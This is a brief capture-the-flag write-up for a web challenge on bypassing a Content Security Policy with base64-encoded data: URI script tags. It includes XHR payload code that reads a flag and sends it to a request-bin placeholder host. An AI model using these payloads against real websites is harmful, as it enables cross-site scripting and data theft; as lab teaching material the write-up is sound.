CSP allows data: URIs.
Bypass the CSP using **data: uri**.

For example for a simple payload of **alert(1)**,
```
<script src="data:text/javascript;base64,YWxlcnQoMSk7"> </script>
```

For this challenge you need to read the flag, you can use XHR: 
```
var xhr = new XMLHttpRequest();    
xhr.open('GET', 'http://[$CHALLENGE_IP]/csp-one-flag', true);
xhr.onload = function () {
var request = new XMLHttpRequest();
request.open('GET', 'http://[$REQUEST_BIN_URI]?flag='+xhr.responseText, true);
request.send()
};
xhr.send(null);
```

Base64 encode it and use it as follows, 
```
<script src="data:text/javascript;base64,[$BASE64_OF_SCRIPT]"></script>
```

For a quick solve run, 
`python solution.py https://web-tutorial-3-d1d398dd.challenges.bsidessf.net/`
